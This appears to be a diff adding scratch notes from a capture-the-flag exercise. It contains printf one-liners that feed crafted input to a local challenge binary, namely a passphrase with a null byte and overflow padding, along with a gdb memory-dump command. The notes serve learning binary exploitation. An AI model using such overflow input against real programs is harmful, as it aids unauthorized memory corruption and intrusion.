@@ -1,0 +1,12 @@
+printf "test\x$(printf %x 100)aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | ./a.out
+
+please please please give me the flagaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+
+printf "\x$(printf %x 0)" | yourprogram
+
+
+printf "please please please give me the flag\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > data
+
+
+dump memory mem2 0x7fffffffdd30 0x7fffffffefff
